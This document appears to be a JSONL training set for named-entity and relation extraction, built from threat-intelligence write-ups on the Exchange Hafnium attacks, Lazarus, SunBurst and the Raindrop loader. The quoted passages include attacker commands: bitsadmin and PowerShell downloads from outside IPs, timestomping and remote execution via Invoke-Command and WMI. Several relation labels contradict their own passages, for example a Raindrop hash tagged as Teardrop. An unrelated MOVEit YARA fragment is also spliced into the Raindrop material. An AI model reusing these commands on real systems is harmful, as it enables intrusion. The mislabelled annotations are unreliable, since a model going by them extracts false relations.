{"instruction": "CVE-2021-27857 : Is an insecure deserialization vulnerability in the Unified Messaging service. An attacker, authenticated either by using CVE-2021-26855 or via stolen admin credentials, could execute arbitrary code as SYSTEM on the Exchange Server. The following diagram shows an attack chain that an attacker could employ to gain initial access to data. Figure. Pre-exploitation to gain initial access", "input": null, "output": "Named Entities: (CVE-2021-27857, vulnerability), (Unified Messaging service, tool), (CVE-2021-26855, vulnerability), (Exchange Server, tool)\nRelationships: (CVE-2021-27857, exploit, Unified Messaging service), (CVE-2021-27857, authenticated by, CVE-2021-26855), (CVE-2021-27857, execute code on, Exchange Server)"}
{"instruction": "Q. Who is Hafnium/Ant? Hafnium, which Symantec tracks as Ant, was the group first seen exploiting the vulnerabilities in Exchange Server, according to Microsoft . It said at the time that Ant was exploiting the zero days to carry out \u201climited and targeted attacks.\u201d Microsoft said Ant used the vulnerabilities \u201cto access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments.\u201d Microsoft stated with \u201chigh confidence\u201d that the group was state-sponsored and operating out of China. It also said the group principally attacked targets in the U.S., including infectious disease researchers, law firms, educational institutes, defense contractors, policy think tanks, and NGOs.", "input": null, "output": "Named Entities: (Hafnium/Ant, attacker), (Ant, attacker)\nRelationships: (Hafnium/Ant, tracks as, Ant)"}
{"instruction": "A few days later, on February 1, a suspicious command was executed to create a scheduled task, which executed \u201cdebug.bat\u201d several hours later. The task was named \u201ctest\u201d, which may indicate that the attackers were using this as a way to test scheduled tasks. Some hours later, the attackers ran \u201cnet start vdir\u201d, which was used to launch a service that had likely been installed by the attackers. On February 6, a suspicious file (sok.wia) was downloaded by the attackers and was used to establish a connection with a remote host. sok.wia 94.177.123.16 443 CSIDL_PROFILE It is likely this connection was used by the attackers to assist in exfiltration because, shortly afterwards, credential-dumping tool Mimikatz was used to dump credentials from the system. The next day, the attackers again use sok.wia, before creating a scheduled task on a remote server (likely using stolen credentials) to execute a \u201cserver.bat\u201d file.", "input": null, "output": "Named Entities: (debug.bat, file), (vdir, tool), (sok.wia, file), (94.177.123.16, IP), (Mimikatz, tool), (server.bat, file)\nRelationships: (attacker, execut, debug.bat), (vdir, launched by, attackers), (attackers, downloaded, sok.wia), (sok.wia, connection with, 94.177.123.16), (attackers, used, Mimikatz)"}
{"instruction": "The next activity was seen on February 18 when Mimikatz was executed once again, and then on February 19 ProcDump was used to dump Isass to \u201che.dmp\u201d, which can be used to harvest credentials. Then later, on March 3, a suspicious file was observed in %Temp%\\in.exe, followed by a suspicious file ({71736495-d485-477d-b836-17f0085e0780}.exe) being extracted via the WinRAR archive tool which creates a malicious file in %system%\\inetsrv\\XmlLite.dll. This was the last activity seen on this machine. Victim 2 Another victim, this one operating in the legal sector in Southeast Asia, saw activity on its network beginning on February 28. This was before Microsoft issued patches for the exploited vulnerabilities, but it has been reported by Veloxity that it saw activity ramping up since February 28, so it is possible information about these vulnerabilities had been leaked in the cyber crime fraternity by this time.", "input": null, "output": "Named Entities: (Mimikatz, tool), (ProcDump, tool), (he.dmp, file), (%Temp%\\in.exe, file), ({71736495-d485-477d-b836-17f0085e0780}.exe, file), (WinRAR, tool), (%system%\\inetsrv\\XmlLite.dll, file)\nRelationships: (Mimikatz, execute, ProcDump), (WinRAR, create, %system%\\inetsrv\\XmlLite.dll)"}
{"instruction": "The first activity on this machine on February 28 was a command used to dump credentials that was executed via the w3wp.exe process. On the same day ProcDump was used to dump Isass, which can be used to harvest credentials. The next day, March 1, a file called \u2018uawmiver.exe\u2019 was executed to bypass user account control (UAC). This was used to execute two batch files called \u201cset.bat\u201d and \u201cset1.bat\u201d. On March 3, a command was used to execute another unknown batch file, which was downloaded by bitsadmin from a remote host: &quot;CSIDL_SYSTEM\\bitsadmin.exe&quot; /rawreturn /transfer getfile http://89.34.111.11/3.avi CSIDL_PROFILE\\public\\2.bat We then saw obfuscated PowerShell commands being executed and used to download a file from a remote host. (new-object System.Net.WebClient).DownloadFile('hxxp://86.105.18.116/news/code','C:\\users\\public\\opera\\code') The next day, March 4, another PowerShell command was executed that searched for \"layout.aspx\" and \"iistart.aspx\". The last access and creation times were modified to August 21, 2017.", "input": null, "output": "Named Entities: (w3wp.exe, file), (ProcDump, tool), (uawmiver.exe, file), (set.bat, file), (set1.bat, file), (bitsadmin.exe, file), (http://89.34.111.11/3, URL), (3.avi, file), (CSIDL_PROFILE\\public\\2.bat, file), (System.Net.WebClient, tool), (hxxp://86.105.18.116/news/code, URL), (layout.aspx, file), (iistart.aspx, file)\nRelationships: (uawmiver.exe, used to execute, set.bat), (uawmiver.exe, used to execute, set1.bat), (bitsadmin.exe, downloaded, 3.avi), (3.avi, download from, http://89.34.111.11/3), (bitsadmin.exe, downloaded, CSIDL_PROFILE\\public\\2.bat)"}
{"instruction": "powershell.exe -command &quot;dir |where {$_.name -eq 'layout.aspx' -or $_.name -eq 'iistart.aspx' } | foreach-object { $_.LastWriteTime = '2017-08-21 20:26:57';$_.LastAccessTime = '2017-08-21 20:26:57'; $_.CreationTime = '2017-08-21 20:26:52' }&quot; This was likely done to help conceal the malicious files and thwart any incident response investigations. 7-Zip was then used to extract the contents of a ZIP archive (current.zip) that was uploaded to the Exchange server by the attackers, before the file \u201ccurrent.exe\u201d was executed, which injected CobaltStrike beacon to a newly-created \u201csvchost.exe\u201d process for backdoor access. Several hours after this, ntdsutil was used to dump credentials once again. Following this, a file called \"mv.exe\", which is likely Mimikatz, was executed to dump credentials. This is followed by ProcDump being used to dump lsass to harvest additional credentials. Shortly after this, an unknown file \"ccsvchst.exe\" was executed, which passes a collected hash.", "input": null, "output": "Named Entities: (powershell.exe, file), (layout.aspx, file), (iistart.aspx, file), (7-Zip, tool), (current.zip, file), (Exchange server, tool), (current.exe, file), (CobaltStrike beacon, malware), (svchost.exe, file), (ntdsutil, tool), (mv.exe, file), (Mimikatz, malware), (ProcDump, tool), (ccsvchst.exe, file)\nRelationships: (Exchange server, execute, current.exe), (current.exe, inject, svchost.exe)"}
{"instruction": "Finally, the attackers launched the publicly available \"secretsdump\" tool, to dump credentials stored in the registry. Then, on March 8, the attackers ran Mimikatz to try to dump credentials again. This was the last activity seen on this machine. Other victims We also observed some post-compromise activity in a small number of other organizations since Microsoft issued their patches on March 2, when activity ramped up significantly as it is believed a large number of threat actors were rushing to exploit these vulnerabilities. Some of the tools we saw used in post-compromise activity in those impacted since March 2 include: PowerShell BITSAadmin Certutil Cobalt Strike EarthWorm tunnel tool Stowaway multi-hop proxy tool China Chopper web shells ReGeorg web shells (seen by Veloxity used in previous Exchange attacks) Chisel Adfind PsExec Mimikatz ProcDump", "input": null, "output": "Named Entities: (secretsdump, tool), (Mimikatz, tool), (PowerShell, tool), (BITSAadmin, tool), (Certutil, tool), (Cobalt Strike, tool), (EarthWorm, tool), (tunnel tool, tool), (Stowaway, tool), (multi-hop proxy tool, tool), (China Chopper, tool), (ReGeorg web shells, tool), (Chisel, tool), (Adfind, tool), (PsExec, tool), (ProcDump, tool)\nRelationships: No related relations."}
{"instruction": "Lazarus: Three North Koreans Charged for Financially Motivated Attacks", "input": null, "output": "Named Entities: (Lazarus, attacker)\nRelationships: No related relations."}
{"instruction": "More than $1.3 billion stolen in string of attacks against financial institutions and cryptocurrency exchanges. \nThe U.S. government has charged three men in relation to a string of financially motivated cyber attacks linked to the North Korean Lazarus (aka Appleworm) group. The attackers stole approximately $1.3 billion from a range of financial institutions and cryptocurrency exchanges. \nIn a second case, a Canadian-American citizen has pleaded guilty to involvement in a money laundering scheme linked to heists organized by the Lazarus group. \nThe charges relate to a number of financially motivated attacks, including several investigated by Symantec, a division of Broadcom (NASDAQ: AVGO).", "input": null, "output": "Named Entities: (Lazarus, attacker), (Appleworm, attacker)\nRelationships: (Lazarus, aka, Appleworm)"}
{"instruction": "Banking attacks Lazarus was linked to a 2016 attack that stole US$81 million from the Bangladesh Central Bank and a number of other attacks against banks in Asia and South America . The attacks prompted an alert by payments network SWIFT, after it was found that the attackers had used malware to cover up evidence of fraudulent transfers. In order to steal such massive sums, the attackers deployed relatively sophisticated malware, most notably Trojan.Banswift, which was used to wipe evidence of fraudulent transactions. Banswift shared code with an older Lazarus tool called Backdoor.Contopee. Contopee, along with two other pieces of Lazarus malware, Backdoor.Fimlis and Backdoor.Fimlis.B, were already being used in limited targeted attacks against the financial sector in South-East Asia.", "input": null, "output": "Named Entities: (Lazarus, attacker), (Trojan.Banswift, malware), (Backdoor.Contopee, malware), (Backdoor.Fimlis, malware), (Backdoor.Fimlis.B, malware)\nRelationships: (Lazarus, deploy, Trojan.Banswift), (Trojan.Banswift, shared code with, Backdoor.Contopee), (Lazarus, tool, Backdoor.Fimlis), (Lazarus, tool, Backdoor.Fimlis.B)"}
{"instruction": "Financially motivated attacks continued into 2017, when dozens of organizations were targeted through watering-hole attacks involving a previously unseen piece of malware . The attackers compromised websites likely to be visited by staff at targeted organizations and used a custom exploit kit to deliver malware to selected targets. The exploit kit was configured to only infect visitors from approximately 150 different IP addresses. These IP addresses belonged to 104 different organizations located in 31 different countries, most of which were banks. While the malware used in these attacks (Downloader.Ratankba) had been previously unseen, further analysis by Symantec uncovered strong links between this tool and known Lazarus tools.", "input": null, "output": "Named Entities: (watering-hole attacks, threat type), (Downloader.Ratankba, malware), (Lazarus tools, tool)\nRelationships: (watering-hole attacks, link to, Downloader.Ratankba), (Downloader.Ratankba, linked to, Lazarus tools)"}
{"instruction": "WannaCry Lazarus was subsequently implicated in the WannaCry ransomware attacks . The ransomware incorporated the leaked EternalBlue exploit that used two known vulnerabilities in Windows ( CVE-2017-0144 and C VE-2017-0145 ) to turn the ransomware into a worm, capable of spreading itself to any unpatched computers on the victim\u2019s network and also to other vulnerable computers connected to the internet.", "input": null, "output": "Named Entities: (Lazarus, attacker), (WannaCry, malware), (EternalBlue, tool), (CVE-2017-0144, vulnerability), (CVE-2017-0145, vulnerability)\nRelationships: (Lazarus, implicated in, WannaCry), (WannaCry, incorporated, EternalBlue), (EternalBlue, use, CVE-2017-0144),  (EternalBlue, use, CVE-2017-0145)"}
{"instruction": "Within a matter of hours, the malware had infected hundreds of thousands of computers worldwide. The attack had the potential to be highly profitable but it was poorly executed. WannaCry was supposed to generate a unique Bitcoin wallet address for each infected computer but, due to a bug, it failed to do so and instead defaulted to three hardcoded Bitcoin addresses for payment. This meant the attackers had no way of knowing which victims had paid using the hardcoded addresses. The attackers also included a \u201ckillswitch\u201d in the malware. This was the address of a non-existent domain. WannaCry was designed to check if the domain was live and, if it was, it would cease installing. However, it was quickly found by a security researcher who registered the domain themselves, thus limiting the damage.", "input": null, "output": "Named Entities: (WannaCry, malware)\nRelationships: No related relations."}
{"instruction": "FASTCash ATM attacks \nThe group\u2019s interest in financially motivated attacks persisted and, in 2018, evidence appeared of its involvement in attacks on ATM networks in Africa and Asia. The operation, known as FASTCash , allowed the group to effectively empty ATMs of cash. The attacks began with breaches of the targeted bank\u2019s network in order to gain access to the switch application server that handled ATM transactions. Malware (Trojan.Fastcash) was installed on the server and used to intercept fraudulent cash withdrawal requests and send falsified approval responses, allowing cash to be withdrawn.", "input": null, "output": "Named Entities: (Trojan.Fastcash, malware)\nRelationships: (group, installed, Trojan.Fastcash)"}
{"instruction": "Cryptocurrency attacks \nIn a related announcement, the FBI, the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Treasury released details on AppleJeus , malware that was used in a series of attacks on cryptocurrency exchanges. The malware is designed to masquerade as legitimate cryptocurrency trading applications. \nAt least seven different versions of AppleJeus have been discovered, each of which is designed to target a different cryptocurrency trading application. The following trading platforms were targeted by the malware: \nCelas Trade Pro \nJMT Trading \nUnion Crypto \nKupay Wallet \nCoinGoTrade \nDorusio \nAnts2Whale \nInitially the malware was spread using fake versions of the legitimate trading platform websites. However, later the attackers switched vectors, relying on phishing, social networking, and social engineering techniques to fool victims into downloading the malware.", "input": null, "output": "Named Entities: (Cryptocurrency attacks, threat type), (AppleJeus, malware), \nRelationships: (AppleJeus, used in, Cryptocurrency attacks)"}
{"instruction": "Far-reaching investigations \nThe indictment is the latest in a series of charges laid out against state-sponsored espionage actors by authorities in the U.S. and comes on the back of a 2018 indictment against one of the men named in this week\u2019s announcement. The charges are a timely reminder of the ability of law enforcement to investigate attacks that originate far beyond national borders.", "input": null, "output": "Named Entities: (state-sponsored espionage actors, attacker)\nRelationships: No related relations."}
{"instruction": "SolarWinds: How Sunburst Sends Data Back to the Attackers", "input": null, "output": "Named Entities: (SolarWinds, malware), (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "In the fourth of a series of follow-up analysis on the SolarWinds attacks, we detail how data is sent to the attackers. In our previous blog we described how the attackers controlled the Sunburst malware, and detailed a variety of commands that will result in data being sent to the threat actors. The next technique to discuss is how Sunburst sends this data to the attackers. If data is being sent to the attacker as a result of a command, instead of performing a HTTP(S) GET request, something we described in our last blog, Sunburst initiates a HTTP(S) POST request. Sunburst uses randomly generated URL paths for HTTP(S) POST requests that are different from HTTP(S) GET requests. If the data to send is greater than 10,000 bytes, the URL path will be as follows: /pki/crl/{0}{1}-{2}.crl element 0 is a number between 100 and 10,000", "input": null, "output": "Named Entities: (Sunburst, malware)\nRelationships: (Sunburst, send data to, SolarWinds attacks)"}
{"instruction": "element 1 is optionally one of the following: -root -cert -universal_ca -ca -primary_ca -timestamp -global -secureca element 2 is the last error code A Content-Type header is set to application/octet-stream and the POST data follows. The POST data consists of the data to send UTF8 encoded, concatenated with the last error code, concatenated with the userid, and subsequently compressed. Every byte of the compressed blob is then summed and the lowest byte of the sum value is used as a key. The compressed blob is XOR\u2019d by the key byte and the key byte is prepended to the encrypted data. Figure 1. Structure of Sunburst POST data If the data to send is less than, or equal to, 10,000 bytes, the URL path will take one of two forms as follows: /fonts/woff/{0}-{1}-{2}-webfont{3}.woff2 element 0 is a random number between 100 and 10,000 element 1 is \"opensans\" or \u201cnoto\u201d", "input": null, "output": "No related entities and relations."}
{"instruction": "element 2 is one of the following: bold bolditalic extrabold extrabolditalic italic light lightitalic regular semibold semibolditalic element 3 is the last error code or /fonts/woff/{0}-{1}-{2}{3}.woff2 element 0 is a random number between 100 and 10,000 element 1 is one of the following: freefont SourceCodePro SourceSerifPro SourceHanSans SourceHanSerif element 2 is one of the following: Bold BoldItalic ExtraBold ExtraBoldItalic Italic Light LightItalic Regular SemiBold SemiBoldItalic element 3 is the last error code Further, instead of sending the encrypted data directly, as when the data is greater than 10,000 bytes, the data is steganographically sent in a faux JSON blob. The JSON blob contains the following fields: userId - contains the userid obfuscated into a GUID sessionId - a randomly generated GUID per HTTP session Timestamp - milliseconds since 1970/1/1 minus five minutes plus a random value between 0-512 with the second bit normally set to 1", "input": null, "output": "No related entities and relations."}
{"instruction": "Index - an incrementing value EventType - set to Orion EventName - set to EventManager DurationMs - the same random value between 0-512 used in the Timestamp Succeeded - set to true Message - a chunk of Base64 encoded data The encrypted data to send is broken into multiple variable sized chunks. The size of each chunk is randomly determined, but generally will go from smaller to larger. If the randomly chosen size is 0, a random chunk between 16 and 28 bytes is generated instead and the Timestamp value is AND\u2019d with the value 18446744073709551613, which more importantly sets the second bit to 0. Each chunk is then encoded and added to the JSON blob and sent as the HTTP(S) POST data with a Content-Type header set to application/json. Figure 2. A contrived example of a JSON file that would be sent by Sunburst", "input": null, "output": "Named Entities: (Orion, tool), (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "On receipt, the attacker will need to decode and concatenate all the Message chunks, skipping junk chunks where the Timestamp second bit is not set. This blog is the final installment of our analysis series concerning the command and control (C&C) process used by the actors behind the SolarWinds attacks. Previous entries have covered how the attackers used Sunburst to disable security software and avoid detection , the malware's use of a rare domain generation algorithm (DGA) to generate domain names to contact for C&C purposes, and Sunburst's control flow and use of IP address values as commands . This final blog, detailing how the malware sends data back to the attackers, rounds out a comprehensive overview of Sunburst\u2019s C&C processes.", "input": null, "output": "Named Entities: (Sunburst, malware)\nRelationships: No related relations."}
{"instruction": "Raindrop: New Malware Discovered in SolarWinds Investigation", "input": null, "output": "Named Entities: (Raindrop, malware), (SolarWinds, tool)\nRelationships: (Raindrop, discovered in, SolarWinds)"}
{"instruction": "Tool was used to spread onto other computers in victims\u2019 networks. \nSymantec, a division of Broadcom (NASDAQ: AVGO), has uncovered an additional piece of malware used in the SolarWinds attacks which was used against a select number of victims that were of interest to the attackers. \nRaindrop (Backdoor.Raindrop) is a loader which delivers a payload of Cobalt Strike. Raindrop is very similar to the already documented Teardrop tool, but there are some key differences between the two. While Teardrop was delivered by the initial Sunburst backdoor (Backdoor.Sunburst), Raindrop appears to have been used for spreading across the victim\u2019s network. Symantec has seen no evidence to date of Raindrop being delivered directly by Sunburst. Instead, it appears elsewhere on networks where at least one computer has already been compromised by Sunburst.", "input": null, "output": "Named Entities: (Raindrop, malware), (Backdoor.Raindrop, malware), (Cobalt Strike, tool), (Teardrop, tool), (Backdoor.Sunburst, malware), (Sunburst, attacker)\nRelationships: (Raindrop, aka, Backdoor.Raindrop), (Raindrop, deliver, Cobalt Strike), (Raindrop, similar to, Teardrop), (Teardrop, delivered by, Backdoor.Sunburst)"}
{"instruction": "Raindrop attacks In one victim, in early July 2020, Sunburst was installed through the SolarWinds Orion update, as has been well documented. Two computers were compromised. The following day, Teardrop was subsequently installed on one of these computers. That computer was found to have an active directory query tool, as well as a credential dumper designed specifically for SolarWinds Orion databases. The credential dumper was similar to, but not the same as, the open source Solarflare tool. Eleven days later, on a third victim computer in the organization, where no previous malicious activity had been observed, a copy of the previously unseen Raindrop was installed under the name bproxy.dll. This computer was running computer access and management software. The attackers could have used this software to access any of the computers in the compromised organization.", "input": null, "output": "Named Entities: (Sunburst, malware), (SolarWinds Orion, tool), (Teardrop, malware), (SolarWinds Orion, tool), (Solarflare, tool), (Raindrop, malware), (bproxy.dll, file)\nRelationships: (Sunburst, installed through, SolarWinds Orion), (Raindrop, installed under the name, bproxy.dll)"}
{"instruction": "One hour later, the Raindrop malware installed an additional file called \"7z.dll\". We were unable to retrieve this file, however, within hours a legitimate version of 7zip was used to extract a copy of what appeared to be Directory Services Internals (DSInternals) onto the computer. DSInternals is a legitimate tool which can be used for querying Active Directory servers and retrieving data, typically passwords, keys, or password hashes. An additional tool called mc_store.exe was later installed by the attackers on this computer. The tool is an unknown PyInstaller packaged application. No further activity was observed on this computer. Figure 1. Example of Raindrop victim timeline", "input": null, "output": "Named Entities: (Raindrop, malware), (7z.dll, file), (7zip, tool), (mc_store.exe, file)\nRelationships: (Raindrop, install, 7z.dll), (Raindrop, install, mc_store.exe)"}
{"instruction": "In a second victim where the Raindrop loader was seen, it was installed in a file called astdrvx64.dll in late May. Several days later, in early June, PowerShell commands were executed on that computer, attempting to execute further instances of Raindrop on additional computers in the organization. \"Invoke-Command -ComputerName REDACTED -ScriptBlock { rundll32 c:\\Packages\\Plugins\\Microsoft.Powershell.DSC\\2.77.0.0\\bin\\TelemetryStatus.dll Tk_CreateItemType}\" \"Invoke-WMIMethod win32_process -name create -argumentlist 'rundll32 c:\\windows\\Speech_OneCore\\Engines\\TTS\\en-US\\enUS.Media.dll TkChangeEventWindow' -ComputerName REDACTED\" In a third victim, where Raindrop was seen, the instance of Cobalt Strike that was extracted did not have a HTTP-based command and control server, but was rather configured to use a network pipe over SMB (\\\\.\\pipe\\protected_storage[REDACTED]). It's possible that in this instance, the victim computer did not have direct access to the internet, and so command and control was routed through another computer on the local network.", "input": null, "output": "Named Entities: (Raindrop loader, malware), (astdrvx64.dll, file), (Raindrop, malware), (Cobalt Strike, tool), (HTTP-based command and control server, tool)\nRelationships: (Raindrop loader, installed in, astdrvx64.dll), (Cobalt Strike, extracted from, Raindrop)"}
{"instruction": "Raindrop technical analysis \nRaindrop is similar to Teardrop in that both pieces of malware act as a loader for Cobalt Strike Beacon. Raindrop uses a custom packer to pack Cobalt Strike. This packer is different to the one used by Teardrop. \nRaindrop is compiled as a DLL, which is built from a modified version of 7-Zip source code. The 7-Zip code is not utilized and is designed to hide malicious functionality added by the attackers. The DLL is compiled where the Name file of the Export Directory Table is \u201c\"7-zip.dll\" and the Export Names are: \nDllCanUnloadNow \nDllGetClassObject \nDllRegisterServer \nDllUnregisterServer \nAnd one of the following, selected at random: \nTk_DistanceToTextLayout \nTk_GetScrollInfoObj \nTk_MainLoop \nXGetGeometry \nThe Export Names used seem to overlap with names used by Tcl/Tk projects (see here and here ).", "input": null, "output": "Named Entities: (Raindrop, malware), (Teardrop, malware), (Cobalt Strike Beacon, tool), (7-Zip, tool), (Tcl/Tk projects, tool)\nRelationships: (Raindrop, act as, Teardrop), (Raindrop, pack, Cobalt Strike Beacon), (Raindrop, compiled from, 7-Zip), (7-Zip, source code, Raindrop), (Raindrop, Export Names, Tcl/Tk projects)"}
{"instruction": "Custom packer Whenever the DLL is loaded, it starts a new thread from the DllMain subroutine that executes the malicious code. This malicious thread performs the following actions: Executes some computation to delay execution. This does not affect functionality. Locates start of the encoded payload which is embedded within legitimate 7-Zip machine code. In order to locate the start of the encoded payload, the packer uses steganography by scanning the bytes starting from the beginning of the subroutine and skipping any bytes until the first occurrence of the following bytes that represent operation codes (opcodes) of interest: .data:0000000180053008 opcodes db 5, 0Dh, 15h, 1Dh, 25h, 2Dh, 35h, 3Dh, 0B8h The malware will then perform the following actions: Extract the encoded payload. This involves simply copying data from pre-determined locations that happen to correspond to immediate values of the relevant machine instructions.", "input": null, "output": "Named Entities: (Custom packer, tool), (7-Zip, tool)\nRelationships: No related relations."}
{"instruction": "Decrypt the extracted payload. This uses the AES algorithm in CBC mode. Decompress the decrypted payload. This uses the LZMA algorithm. Decrypt the decompressed payload. This is simple XOR with byte key and as such does not impact compression ratio. Execute the decrypted payload as shellcode.", "input": null, "output": "No related entities and relations."}
{"instruction": "Raindrop and Teardrop comparison Although Raindrop is very similar to Teardrop, there are some key differences between the tools. As mentioned previously, Raindrop uses a different packer. The packers differ in the following ways: TEARDROP RAINDROP PAYLOAD FORMAT Custom, reusing features from PE format. It may be possible to reuse the packer with a range of different payloads supplied as PE DLLs with automatic conversion. Shellcode only. PAYLOAD EMBEDDING Binary blob in data section. Steganography, stored at pre-determined locations within the machine code. PAYLOAD ENCRYPTION visualDecrypt combined with XOR using long key. AES layer before decompression; separate XOR layer using one byte key after decompression. PAYLOAD COMPRESSION None. LZMA. OBFUSCATION Reading JPEG file. Inserted blocks of junk code, some could be generated using a polymorphic engine. Non-functional code to delay execution. EXPORT NAMES Export names vary, in some cases names overlapping with Tcl/Tk projects. Export names overlap with Tcl/Tk projects.", "input": null, "output": "Named Entities: (Raindrop, malware), (Teardrop, malware), (packer, tool), (Tcl/Tk projects, tool)\nRelationships: (Raindrop, similar to, Teardrop), (Raindrop, use, packer), (Raindrop, use, Tcl/Tk projects)"}
{"instruction": "STOLEN CODE Byte-copy of machine code from pre-existing third-party components. The original code is distributed in compiled format only. Recompiled third-party source code. While both malware families are designed to deploy Cobalt Strike Beacon, there are differences in Cobalt Strike configuration. To date, Symantec has seen four samples of Raindrop. In three cases, Cobalt Strike was configured to use HTTPS as a communication protocol. In the fourth it was configured to use SMB Named Pipe as a communication protocol. All three Raindrop samples using HTTPS communication follow very similar configuration patterns as previously seen in one Teardrop sample (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07). The most important similarities are highlighted below. TEARDROP SHA256 b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07 URLs https(://)infinitysoftwares(.)com/files/information_055.pdf https(://)infinitysoftwares(.)com/wp-admin/new_file.php POST FORM name=\"uploaded_1\";filename=\"33139.pdf\" Content-Type: text/plain RAINDROP SHA256 be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725 URLs https(://)bigtopweb(.)com/files/page_306.pdf https(://)bigtopweb(.)com/wp-admin/admin-ajax.php POST FORM name=\"uploaded_1\";filename=\"84921.pdf\" Content-Type: text/plain RAINDROP SHA256 f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418 URLs https(://)panhardware(.)com/files/documentation_076.pdf https(://)panhardware(.)com/wp-admin/new_file.php POST FORM name=\"uploaded_1\";filename=\"18824.pdf\" Content-Type: text/plain", "input": null, "output": "Named Entities: (Raindrop, malware), (Teardrop, malware), (Cobalt Strike Beacon, tool), (b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07, SHA256), (https(://)infinitysoftwares(.)com/files/information_055.pdf, URL), (https(://)infinitysoftwares(.)com/wp-admin/new_file.php, URL), (be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725, SHA256), (https(://)bigtopweb(.)com/files/page_306.pdf, URL), (https(://)bigtopweb(.)com/wp-admin/admin-ajax.php, URL), (f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418, SHA256), (https(://)panhardware(.)com/files/documentation_076.pdf, URL), (https(://)panhardware(.)com/wp-admin/new_file.php, URL)\nRelationships: (Raindrop, deploy, Cobalt Strike Beacon), (Raindrop, similar configuration, Teardrop), (Teardrop, sample hash, b820e8a2057112d0ed73bd7995201dbed79a79e13c79d4bdad81a22f12387e07), (Raindrop, sample hash, be9dbbec6937dfe0a652c0603d4972ba354e83c06b8397d6555fd1847da36725), (Teardrop, sample hash, f2d38a29f6727f4ade62d88d8a68de0d52a0695930b8c92437a2f9e4de92e418)"}
{"instruction": "All of the aforementioned domains use a common Registrar, NameSilo, LLC and, except for panhardware[.]com, which is currently sinkholed, have common name servers: ns1.dnsowl.com ns2.dnsowl.com ns3.dnsowl.com", "input": null, "output": "Named Entities: (panhardware[.]com, Domain), (ns1.dnsowl.com, Domain), (ns2.dnsowl.com, Domain), (ns3.dnsowl.com, Domain)\nRelationships: No related relations."}
{"instruction": "sample = \"cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45x\" date = \"2023/06/01\" version = \"1\" strings: $head = \"<%@ Page\" $s1 = \"X-siLock-Comment\" $s2 = \"X-siLock-Step\" $s3 = \"Health Check Service\" $s4 = /pass, \\\"[a-z0-9]{8}-[a-z0-9]{4}/ $s5 = \"attachment;filename={0}\" condition: filesize > 5KB and filesize < 10KB and ( ($head in (0..50) and 2 of ($s*)) or (3 of ($s*)) ) } rule MOVEit_Transfer_exploit_webshell_aspx { meta: date = \"2023-06-01\" description = \"Detects indicators of compromise in MOVEit Transfer exploitation.\" author = \"Ahmet Payaslioglu - Binalyze DFIR Lab\" hash1 = \"44d8e68c7c4e04ed3adacb5a88450552\" hash2 = \"a85299f78ab5dd05e7f0f11ecea165ea\" reference1 = \"https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/\" reference2 = \"https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/\" reference3 = \"https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643\" verdict = \"dangerous\" mitre = \"T1505.003\" platform = \"windows\" search_context = \"filesystem\" strings: $a1 = \"MOVEit.DMZ\" $a2 = \"Request.Headers[\\\"X-siLock-Comment\\\"]\" $a3 = \"Delete FROM users WHERE RealName='Health Check Service'\" $a4 = \"set[\\\"Username\\\"]\" $a5 = \"INSERT INTO users (Username, LoginName, InstID, Permission, RealName\" $a6 = \"Encryption.OpenFileForDecryption(dataFilePath, siGlobs.FileSystemFactory.Create()\" $a7 = \"Response.StatusCode = 404;\" condition: filesize < 10KB", "input": null, "output": "Named Entities: (https://www.reddit.com/r/msp/comments/13xjs1y/tracking_emerging_moveit_transfer_critical/, URL), (https://www.bleepingcomputer.com/news/security/new-moveit-transfer-zero-day-mass-exploited-in-data-theft-attacks/, URL), (https://gist.github.com/JohnHammond/44ce8556f798b7f6a7574148b679c643, URL), (T1505.003, technique)\nRelationships: No related ralations."}
{"instruction": "Clearer picture \nThe discovery of Raindrop is a significant step in our investigation of the SolarWinds attacks as it provides further insights into post-compromise activity at organizations of interest to the attackers. While Teardrop was used on computers that had been infected by the original Sunburst Trojan, Raindrop appeared elsewhere on the network, being used by the attackers to move laterally and deploy payloads on other computers.", "input": null, "output": "Named Entities: (Raindrop, malware), (Teardrop, malware), (Sunburst Trojan, malware)\nRelationships: (SolarWinds attacks, related to, Raindrop), (Sunburst Trojan, related to, Teardrop)"}
{"instruction": "Yara Rules rule RaindropPacker { meta: copyright = \"Symantec\" family = \"Raindrop\" strings: $code = { 41 8B 4F 20 // mov ecx, [r15+20h] 49 8D 77 24 // lea rsi, [r15+24h] 89 8D ?? ?? 00 00 // mov dword ptr [rbp+0A0h+arg_0], ecx E8 ?? ?? ?? ?? // call sub_180010270 33 D2 // xor edx, edx 48 8D 4C 24 ?? // lea rcx, [rsp+1A0h+var_160] 44 8D 42 10 // lea r8d, [rdx+10h] E8 ?? ?? ?? ?? // call sub_180038610 48 8D 5C 24 ?? // lea rbx, [rsp+1A0h+var_150] F7 DB // neg ebx 48 8D 7C 24 ?? // lea rdi, [rsp+1A0h+var_150] 48 C1 EB 02 // shr rbx, 2 48 8D 54 24 ?? // lea rdx, [rsp+1A0h+var_160] 83 E3 03 // and ebx, 3 48 8D 3C 9F // lea rdi, [rdi+rbx*4] 48 8B CF // mov rcx, rdi", "input": null, "output": "Named Entities: (RaindropPacker, malware)\nRelationships: No related relations."}
